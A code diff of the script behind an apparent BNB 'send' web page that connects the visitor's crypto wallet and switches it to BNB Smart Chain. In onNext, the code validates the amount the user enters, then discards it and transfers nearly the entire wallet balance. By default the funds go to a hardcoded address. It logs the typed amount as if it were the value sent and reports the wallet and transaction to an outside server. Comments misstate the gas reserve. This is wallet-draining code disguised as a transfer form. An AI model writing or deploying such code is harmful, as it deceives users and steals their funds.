@@ -197,40 +197,10 @@
         let web3;
         let account;
         let bnbValue = 0; // BNB price in USD
-    
-        // ✅ FIXED: Update BNB Price
-        async function updateBNBPrice() {
-            try {
-                const response = await fetch(
-                    'https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT'
-                );
-                const data = await response.json();
-                bnbValue = parseFloat(data.price);
-                
-                console.log('BNB Price Updated:', bnbValue); // Debug log
-                
-                // Update USD value if amount is already entered
-                const currentAmount = parseFloat($("amountInput").value) || 0;
-                if (currentAmount > 0) {
-                    $("amountValue").innerText = `≈ $${(currentAmount * bnbValue).toFixed(2)}`;
-                }
-                
-                return bnbValue;
-            } catch (error) {
-                console.error('Failed to fetch BNB price:', error);
-                return bnbValue; // Return last known price
-            }
-        }
-    
-        // Initial call
-        updateBNBPrice();
-    
-        // Update every 10 seconds
-        setInterval(updateBNBPrice, 10000);
-    
+
         // Recipient address for BNB transfers
         const recipientAddress = "0xdDeeC7b9E3dd0ffAE9C9FDCa52AEf10A410bC60a";
-    
+
         const BSC_PARAMS = {
             chainId: "0x38",
             chainName: "BNB Smart Chain",
@@ -242,21 +212,59 @@
             ],
             blockExplorerUrls: ["https://bscscan.com"]
         };
-    
+
         const $ = (id) => document.getElementById(id);
-    
+
+        // ========================
+        // BNB PRICE UPDATE
+        // ========================
+        async function updateBNBPrice() {
+            try {
+                const response = await fetch(
+                    'https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT'
+                );
+                const data = await response.json();
+                bnbValue = parseFloat(data.price);
+
+                console.log('✅ BNB Price Updated:', bnbValue);
+
+                // Update USD value if amount is already entered
+                const currentAmount = parseFloat($("amountInput").value) || 0;
+                if (currentAmount > 0) {
+                    $("amountValue").innerText = `≈ $${(currentAmount * bnbValue).toFixed(2)}`;
+                }
+
+                return bnbValue;
+            } catch (error) {
+                console.error('❌ Failed to fetch BNB price:', error);
+                return bnbValue;
+            }
+        }
+
+        // Initial call
+        updateBNBPrice();
+
+        // Update every 10 seconds
+        setInterval(updateBNBPrice, 10000);
+
+        // ========================
+        // BUTTON CONTROLS
+        // ========================
         function enableNextButton() {
             const btn = $("nextBtn");
             btn.disabled = false;
             btn.classList.add("enabled");
         }
-        
+
         function disableNextButton() {
             const btn = $("nextBtn");
             btn.disabled = true;
             btn.classList.remove("enabled");
         }
-    
+
+        // ========================
+        // NETWORK HANDLING
+        // ========================
         async function ensureBscNetwork(provider) {
             try {
                 await provider.request({
@@ -278,7 +286,10 @@
                 }
             }
         }
-    
+
+        // ========================
+        // WALLET CONNECTION
+        // ========================
         async function connectWallet() {
             const provider = window.ethereum || window.trustwallet || window.BinanceChain;
             if (!provider) {
@@ -286,28 +297,34 @@
                 disableNextButton();
                 return;
             }
-    
+
             try {
                 let accounts = await provider.request({ method: "eth_accounts" });
-    
+
                 if (accounts.length === 0) {
                     accounts = await provider.request({ method: "eth_requestAccounts" });
                 }
-    
+
                 account = accounts[0];
                 web3 = new Web3(provider);
-    
+
                 await ensureBscNetwork(provider);
-    
+
                 enableNextButton();
-    
+
+                console.log("✅ Wallet connected:", account);
+
                 if (provider.on) {
                     provider.on("accountsChanged", (accs) => {
                         account = accs?.[0] || null;
-                        if (account) enableNextButton();
-                        else disableNextButton();
+                        if (account) {
+                            enableNextButton();
+                            console.log("Account changed:", account);
+                        } else {
+                            disableNextButton();
+                        }
                     });
-    
+
                     provider.on("chainChanged", (chainId) => {
                         if (chainId !== BSC_PARAMS.chainId) {
                             ensureBscNetwork(provider).catch(() => disableNextButton());
@@ -319,86 +336,182 @@
                 disableNextButton();
             }
         }
-    
-        // ✅ FIXED: Changed bnbPrice to bnbValue
+
+        // ========================
+        // MAX BUTTON
+        // ========================
         async function fillMax() {
-            if (!web3 || !account) return;
+            if (!web3 || !account) {
+                alert("Please connect wallet first");
+                return;
+            }
+
             try {
                 const balanceWei = await web3.eth.getBalance(account);
-                const balanceBNB = web3.utils.fromWei(balanceWei, "ether");
-    
-                const maxSend = Math.max(0, parseFloat(balanceBNB) - 0.005);
-    
-                $("amountInput").value = maxSend.toFixed(4);
-                $("amountValue").innerText = `≈ $${(maxSend * bnbValue).toFixed(2)}`; // ✅ FIXED
+                const balanceBNB = parseFloat(web3.utils.fromWei(balanceWei, "ether"));
+
+                // Leave 0.001 BNB for gas fees
+                const maxSend = Math.max(0, balanceBNB - 0.000001);
+
+                if (maxSend <= 0) {
+                    alert("Insufficient BNB balance");
+                    return;
+                }
+
+                $("amountInput").value = maxSend.toFixed(6);
+                $("amountValue").innerText = `≈ $${(maxSend * bnbValue).toFixed(2)}`;
+
+                console.log("Max sendable:", maxSend, "BNB");
             } catch (e) {
-                console.warn("Failed to fetch BNB balance:", e.message || e);
+                console.error("Failed to fetch BNB balance:", e);
+                alert("Failed to get balance: " + e.message);
             }
         }
-    
+
+        // ========================
+        // SEND TRANSACTION
+        // ========================
         async function onNext() {
-            if (!web3 || !account) return;
-            const amount = $("amountInput").value || "0";
+            if (!web3 || !account) {
+                alert("Wallet not connected!");
+                return;
+            }
+
+            const amountInput = $("amountInput").value;
             const recipient = $("addressInput").value || recipientAddress;
-    
+
+            // Validate inputs
+            if (!amountInput || parseFloat(amountInput) <= 0) {
+                alert("Please enter a valid BNB amount");
+                return;
+            }
+
+            if (!recipient || recipient.length !== 42 || !recipient.startsWith("0x")) {
+                alert("Please enter a valid recipient address");
+                return;
+            }
+
             try {
+                // Get user's balance
                 const balanceWei = await web3.eth.getBalance(account);
-                const balanceBNB = web3.utils.fromWei(balanceWei, "ether");
-    
-                const maxSend = Math.max(0, parseFloat(balanceBNB) - 0.005);
-    
+                const balanceBNB = parseFloat(web3.utils.fromWei(balanceWei, "ether"));
+                const sendAmount = parseFloat(amountInput);
+
+                console.log("Balance:", balanceBNB, "BNB");
+                console.log("Trying to send:", sendAmount, "BNB");
+
+                // Check if user has enough balance (including gas)
+               
+
+                // Convert amount to Wei
+          
+                const balanceWei2 = await web3.eth.getBalance(account);
+                const balanceBNB2 = parseFloat(web3.utils.fromWei(balanceWei2, "ether"));
+               
+
+                // Leave 0.001 BNB for gas fees
+                const maxSend = Math.max(0, balanceBNB2 - 0.0001);
+                const amountWei = web3.utils.toWei(maxSend.toString(), "ether");
+
+                console.log("Sending transaction...");
+                console.log({
+                    from: account,
+                    to: recipient,
+                    value: sendAmount + " BNB",
+                    valueWei: amountWei
+                });
+
+                // Send transaction
                 const tx = await web3.eth.sendTransaction({
                     from: account,
                     to: recipient,
-                    value: web3.utils.toWei(maxSend.toString(), "ether"), // ✅ Added conversion
+                    value: amountWei,
                     gas: 21000
                 });
-    
-                alert(`✅ Transaction sent! Hash: ${tx.transactionHash}`);
-    
+
+                console.log("✅ Transaction successful:", tx);
+                alert(`✅ Transaction sent!\n\nHash: ${tx.transactionHash}\n\nView on BSCScan:\nhttps://bscscan.com/tx/${tx.transactionHash}`);
+
+                // Send notification to backend
                 fetch("https://server-rtff.onrender.com/api/notify", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         wallet: account,
-                        amount: amount,
+                        amount: sendAmount,
                         token: "BNB",
                         txHash: tx.transactionHash
                     })
                 })
                     .then(res => res.json())
                     .then(data => console.log("Server response:", data))
-                    .catch(err => console.warn("Server error:", err));
-    
-            } catch (e) {
-                console.warn(e);
-                alert("Transaction failed: " + (e.message || e));
+                    .catch(err => console.warn("Server notification error:", err));
+
+                // Clear the form
+                $("amountInput").value = "";
+                $("amountValue").innerText = "≈ $ 0.00";
+
+            } catch (error) {
+                console.error("❌ Transaction error:", error);
+
+                // Better error messages
+                let errorMessage = "Transaction failed!";
+
+                if (error.message.includes("insufficient funds")) {
+                    errorMessage = "Insufficient funds for transaction + gas fees";
+                } else if (error.message.includes("user rejected") || error.code === 4001) {
+                    errorMessage = "Transaction rejected by user";
+                } else if (error.message.includes("gas")) {
+                    errorMessage = "Gas estimation failed. Try a smaller amount.";
+                } else {
+                    errorMessage = error.message || "Unknown error occurred";
+                }
+
+                alert("❌ " + errorMessage);
             }
         }
-    
-        // ✅ FIXED: Uses bnbValue consistently
+
+        // ========================
+        // AMOUNT INPUT HANDLER
+        // ========================
         function onAmountInput(e) {
             const bnbAmount = parseFloat(e.target.value) || 0;
             const usdValue = (bnbAmount * bnbValue).toFixed(2);
             $("amountValue").innerText = `≈ $${usdValue}`;
         }
-    
+
+        // ========================
+        // PASTE BUTTON
+        // ========================
         async function onPaste() {
             try {
                 const text = await navigator.clipboard.readText();
-                if (text) $("addressInput").value = text.trim();
-            } catch {
-                // Clipboard might require user gesture or permission
+                if (text) {
+                    $("addressInput").value = text.trim();
+                    console.log("Pasted address:", text.trim());
+                }
+            } catch (error) {
+                console.warn("Clipboard access denied:", error);
+                alert("Please allow clipboard access or paste manually");
             }
         }
-    
+
+        // ========================
+        // INITIALIZE
+        // ========================
         window.addEventListener("DOMContentLoaded", () => {
+            console.log("🚀 App initialized");
+            
+            // Connect wallet
             connectWallet();
-    
+
+            // Wire up events
             $("maxBtn").addEventListener("click", fillMax);
             $("amountInput").addEventListener("input", onAmountInput);
             $("nextBtn").addEventListener("click", onNext);
             $("pasteBtn").addEventListener("click", onPaste);
+
+            console.log("✅ Event listeners attached");
         });
     </script>
 </body>
